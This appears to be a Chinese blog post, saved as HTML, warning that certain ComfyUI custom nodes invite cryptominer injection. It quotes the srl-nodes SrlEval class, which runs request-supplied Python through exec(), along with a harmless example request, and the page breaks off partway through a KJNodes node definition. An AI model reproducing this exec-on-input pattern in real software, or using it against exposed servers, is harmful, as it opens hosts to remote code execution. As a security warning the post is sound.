@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mirroryuchen.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点集合">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点">
+<meta property="og:url" content="http://mirroryuchen.github.io/2026/03/17/Comfyui%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E4%B8%80%E4%BA%9B%E5%AE%B9%E6%98%93%E8%A2%AB%E6%B3%A8%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%8A%82%E7%82%B9/index.html">
+<meta property="og:site_name" content="小小宇宙镜">
+<meta property="og:description" content="Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点集合">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-17T01:28:19.000Z">
+<meta property="article:modified_time" content="2026-07-09T03:08:22.421Z">
+<meta property="article:author" content="MirrorYuChen">
+<meta property="article:tag" content="ComfyUI">
+<meta property="article:tag" content="ComfyUI-Manager">
+<meta property="article:tag" content="srl-nodes">
+<meta property="article:tag" content="comfyui-kjnodes">
+<meta property="article:tag" content="ComfyUI-Notebook">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://mirroryuchen.github.io/2026/03/17/Comfyui%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E4%B8%80%E4%BA%9B%E5%AE%B9%E6%98%93%E8%A2%AB%E6%B3%A8%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%8A%82%E7%82%B9/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://mirroryuchen.github.io/2026/03/17/Comfyui%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E4%B8%80%E4%BA%9B%E5%AE%B9%E6%98%93%E8%A2%AB%E6%B3%A8%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%8A%82%E7%82%B9/","path":"2026/03/17/Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点/","title":"Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点 | 小小宇宙镜</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">小小宇宙镜</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">"怕什么真理无穷，进一寸有一寸的欢喜。"——胡适谈求知</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-srl-nodes"><span class="nav-text">1.srl-nodes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-comfyui-kjnodes"><span class="nav-text">2.comfyui-kjnodes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ComfyUI-Manager"><span class="nav-text">3.ComfyUI-Manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-ComfyUI-Notebook"><span class="nav-text">4.ComfyUI-Notebook</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">MirrorYuChen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/MirrorYuChen" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;MirrorYuChen" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/2458006366@qq.com" title="E-Mail → 2458006366@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mirroryuchen.github.io/2026/03/17/Comfyui%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E4%B8%80%E4%BA%9B%E5%AE%B9%E6%98%93%E8%A2%AB%E6%B3%A8%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%8A%82%E7%82%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirrorYuChen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小宇宙镜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点 | 小小宇宙镜">
+      <meta itemprop="description" content="Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点集合">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-03-17 09:28:19" itemprop="dateCreated datePublished" datetime="2026-03-17T09:28:19+08:00">2026-03-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-07-09 11:08:22" itemprop="dateModified" datetime="2026-07-09T11:08:22+08:00">2026-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/comfyui/" itemprop="url" rel="index"><span itemprop="name">comfyui</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Comfyui学习笔记（四）：一些容易被注入挖矿程序的节点集合</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="1-srl-nodes"><a href="#1-srl-nodes" class="headerlink" title="1.srl-nodes"></a>1.<a target="_blank" rel="noopener" href="https://github.com/seanlynch/srl-nodes">srl-nodes</a></h2><p>&emsp;其中有个节点<code>SrlEval</code>，节点定义如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SrlEval</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Evaluate any Python code as a function with the given inputs.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">INPUT_TYPES</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;required&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;parameters&quot;</span>: (<span class="string">&quot;STRING&quot;</span>, &#123;</span><br><span class="line">                    <span class="string">&quot;multiline&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                    <span class="string">&quot;default&quot;</span>: <span class="string">&quot;a, b=None, c=\&quot;foo\&quot;, *rest&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;dynamicPrompts&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                &#125;),</span><br><span class="line">                <span class="string">&quot;code&quot;</span>: (<span class="string">&quot;STRING&quot;</span>, &#123;</span><br><span class="line">                    <span class="string">&quot;multiline&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                    <span class="string">&quot;default&quot;</span>: <span class="string">&quot;code goes here\nreturn a + b&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;dynamicPrompts&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                &#125;),</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;optional&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;arg0&quot;</span>: (any_typ,),</span><br><span class="line">                <span class="string">&quot;arg1&quot;</span>: (any_typ,),</span><br><span class="line">                <span class="string">&quot;arg2&quot;</span>: (any_typ,),</span><br><span class="line">                <span class="string">&quot;arg3&quot;</span>: (any_typ,),</span><br><span class="line">                <span class="string">&quot;arg4&quot;</span>: (any_typ,),</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    RETURN_TYPES = (any_typ,)</span><br><span class="line">    FUNCTION = <span class="string">&quot;doit&quot;</span></span><br><span class="line">    CATEGORY = <span class="string">&quot;utils&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">doit</span>(<span class="params">self, parameters, code, **kw</span>):</span><br><span class="line">        <span class="comment"># 对传入的code每行自动缩进四个空格</span></span><br><span class="line">        func_code = textwrap.indent(code, <span class="string">&quot;    &quot;</span>)</span><br><span class="line">        source = <span class="string">f&quot;def func(<span class="subst">&#123;parameters&#125;</span>):\n<span class="subst">&#123;func_code&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The provided code can mutate globals or really do anything, but ComfyUI isn&#x27;t secure to begin with.</span></span><br><span class="line">        loc = &#123;&#125;</span><br><span class="line">        <span class="built_in">exec</span>(source, <span class="built_in">globals</span>(), loc)</span><br><span class="line">        func = loc[<span class="string">&quot;func&quot;</span>]</span><br><span class="line"></span><br><span class="line">        argspec = inspect.getfullargspec(func)</span><br><span class="line">        <span class="comment"># We don&#x27;t allow variable keyword arguments or keyword only arguments, but we do allow varargs</span></span><br><span class="line">        <span class="keyword">assert</span> argspec.varkw <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> argspec.kwonlyargs</span><br><span class="line"></span><br><span class="line">        input_names = <span class="built_in">list</span>(<span class="variable language_">self</span>.INPUT_TYPES()[<span class="string">&quot;optional&quot;</span>].keys())</span><br><span class="line">        parameter_names = argspec.args</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert the list of defaults into a dictionary to make it easier to use</span></span><br><span class="line">        default_list = argspec.defaults <span class="keyword">if</span> argspec.defaults <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> []</span><br><span class="line">        defaults = &#123;parameter_name: default <span class="keyword">for</span> parameter_name, default <span class="keyword">in</span> <span class="built_in">zip</span>(parameter_names[-<span class="built_in">len</span>(default_list):], default_list)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># We handle substituting default values ourselves in order to support *args</span></span><br><span class="line">        args = [kw[input_name] <span class="keyword">if</span> input_name <span class="keyword">in</span> kw <span class="keyword">else</span> defaults[parameter_name] <span class="keyword">for</span> parameter_name, input_name <span class="keyword">in</span> <span class="built_in">zip</span>(parameter_names, input_names)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Support *args</span></span><br><span class="line">        <span class="keyword">if</span> argspec.varargs <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            unnamed_inputs = input_names[<span class="built_in">len</span>(argspec.args):]</span><br><span class="line">            <span class="comment"># I considered requiring the remaining inputs to be contiguous, but I don&#x27;t think it&#x27;s helpful.</span></span><br><span class="line">            args += [kw[input_name] <span class="keyword">for</span> input_name <span class="keyword">in</span> unnamed_inputs <span class="keyword">if</span> input_name <span class="keyword">in</span> kw]</span><br><span class="line"></span><br><span class="line">        ret = func(*args)</span><br><span class="line">        <span class="keyword">return</span> (ret,)</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;可以发送一个请求，直接远程执行Python代码，如：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a, b&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sum = a + b\nmul = a * b\nreturn sum + mul&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;kw&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-comfyui-kjnodes"><a href="#2-comfyui-kjnodes" class="headerlink" title="2.comfyui-kjnodes"></a>2.<a target="_blank" rel="noopener" href="https://github.com/kijai/ComfyUI-KJNodes">comfyui-kjnodes</a></h2><ul>
+<li>(1) 节点<code>SamplerSelfRefineVideo</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SamplerSelfRefineVideo</span>(io.ComfyNode):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">define_schema</span>(<span class="params">cls</span>):</span><br><span class="line">        default_ranges = [</span><br><span class="line">            (<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>),   <span class="comment"># Range 1</span></span><br><span class="line">            (<span class="number">6</span>, <span class="number">14</span>, <span class="number">1</span>),  <span class="comment"># Range 2</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        options = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Option 1: 2 ranges</span></span><br><span class="line">        range_inputs_2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">            start_default, end_default, steps_default = default_ranges[i - <span class="number">1</span>]</span><br><span class="line">            range_inputs_2.extend([</span><br><span class="line">                io.Int.Input(<span class="string">f&quot;start_step<span class="subst">&#123;i&#125;</span>&quot;</span>, default=start_default, <span class="built_in">min</span>=<span class="number">0</span>, <span class="built_in">max</span>=<span class="number">999</span>, step=<span class="number">1</span>, tooltip=<span class="string">f&quot;Start step for range <span class="subst">&#123;i&#125;</span>&quot;</span>),</span><br><span class="line">                io.Int.Input(<span class="string">f&quot;end_step<span class="subst">&#123;i&#125;</span>&quot;</span>, default=end_default, <span class="built_in">min</span>=<span class="number">0</span>, <span class="built_in">max</span>=<span class="number">999</span>, step=<span class="number">1</span>, tooltip=<span class="string">f&quot;End step for range <span class="subst">&#123;i&#125;</span>&quot;</span>),</span><br><span class="line">                io.Int.Input(<span class="string">f&quot;steps_<span class="subst">&#123;i&#125;</span>&quot;</span>, default=steps_default, <span class="built_in">min</span>=<span class="number">1</span>, <span class="built_in">max</span>=<span class="number">100</span>, step=<span class="number">1</span>, tooltip=<span class="string">f&quot;Number of P&amp;P steps for range <span class="subst">&#123;i&#125;</span>&quot;</span>),</span><br><span class="line">            ])</span><br><span class="line">        options.append(io.DynamicCombo.Option(key=<span class="string">&quot;2 ranges&quot;</span>, inputs=range_inputs_2))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Option 2: 1 range</span></span><br><span class="line">        range_inputs_1 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">            start_default, end_default, steps_default = default_ranges[i - <span class="number">1</span>]</span><br><span class="line">            range_inputs_1.extend([</span><br><span class="line">                io.Int.Input(<span class="string">f&quot;start_step<span class="subst">&#123;i&#125;</span>&quot;</span>, default=start_default, <span class="built_in">min</span>=<span class="number">0</span>, <span class="built_in">max</span>=<span class="number">999</span>, step=<span class="number">1</span>, tooltip=<span class="string">f&quot;Start step for range <span class="subst">&#123;i&#125;</span>&quot;</span>),</span><br><span class="line">                io.Int.Input(<span class="string">f&quot;end_step<span class="subst">&#123;i&#125;</span>&quot;</span>, default=end_default, <span class="built_in">min</span>=<span class="number">0</span>, <span class="built_in">max</span>=<span class="number">999</span>, step=<span class="number">1</span>, tooltip=<span class="string">f&quot;End step for range <span class="subst">&#123;i&#125;</span>&quot;</span>),</span><br><span class="line">                io.Int.Input(<span class="string">f&quot;steps_<span class="subst">&#123;i&#125;</span>&quot;</span>, default=steps_default, <span class="built_in">min</span>=<span class="number">1</span>, <span class="built_in">max</span>=<span class="number">100</span>, step=<span class="number">1</span>, tooltip=<span class="string">f&quot;Number of P&amp;P steps for range <span class="subst">&#123;i&#125;</span>&quot;</span>),</span><br><span class="line">            ])</span><br><span class="line">        options.append(io.DynamicCombo.Option(key=<span class="string">&quot;1 range&quot;</span>, inputs=range_inputs_1))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Option 3: Manual string input</span></span><br><span class="line">        options.append(io.DynamicCombo.Option(</span><br><span class="line">            key=<span class="string">&quot;from_string&quot;</span>,</span><br><span class="line">            inputs=[</span><br><span class="line">                io.String.Input(</span><br><span class="line">                    <span class="string">&quot;stochastic_plan&quot;</span>,</span><br><span class="line">                    default=<span class="string">&quot;2-5:3,6-14:1&quot;</span>,</span><br><span class="line">                    multiline=<span class="literal">True</span>,</span><br><span class="line">                    tooltip=<span class="string">&quot;Format: &#x27;start-end:steps,start-end:steps&#x27; e.g. &#x27;2-5:3,6-14:1&#x27;&quot;</span></span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line">        ))</span><br><span class="line">        <span class="keyword">return</span> io.Schema(</span><br><span class="line">            node_id=<span class="string">&quot;SamplerSelfRefineVideo&quot;</span>,</span><br><span class="line">            category=<span class="string">&quot;KJNodes/samplers&quot;</span>,</span><br><span class="line">            description=<span class="string">&quot;Attempt to implement https://github.com/agwmon/self-refine-video, for testing only, MAY NOT WORK AS INTENDED.&quot;</span>,</span><br><span class="line">            is_experimental=<span class="literal">True</span>,</span><br><span class="line">            inputs=[</span><br><span class="line">                io.DynamicCombo.Input(<span class="string">&quot;input_mode&quot;</span>, options=options, tooltip=<span class="string">&quot;How to configure the step plan&quot;</span>),</span><br><span class="line">                io.Float.Input(<span class="string">&quot;certain_percentage&quot;</span>, default=<span class="number">0.999</span>, <span class="built_in">min</span>=<span class="number">0.0</span>, <span class="built_in">max</span>=<span class="number">1.0</span>, step=<span class="number">0.001</span>, <span class="built_in">round</span>=<span class="literal">False</span>, tooltip=<span class="string">&quot;Percentage of certain pixels to consider the frame as certain and skip further refinement&quot;</span>),</span><br><span class="line">                io.Float.Input(<span class="string">&quot;uncertainty_threshold&quot;</span>, default=<span class="number">0.2</span>, <span class="built_in">min</span>=<span class="number">0.0</span>, <span class="built_in">max</span>=<span class="number">1.0</span>, step=<span class="number">0.01</span>, <span class="built_in">round</span>=<span class="literal">False</span>, tooltip=<span class="string">&quot;Threshold of uncertainty to consider a pixel uncertain&quot;</span>),</span><br><span class="line">                io.Boolean.Input(<span class="string">&quot;verbose&quot;</span>, default=<span class="literal">False</span>, tooltip=<span class="string">&quot;Enable verbose logging during sampling&quot;</span>),</span><br><span class="line">                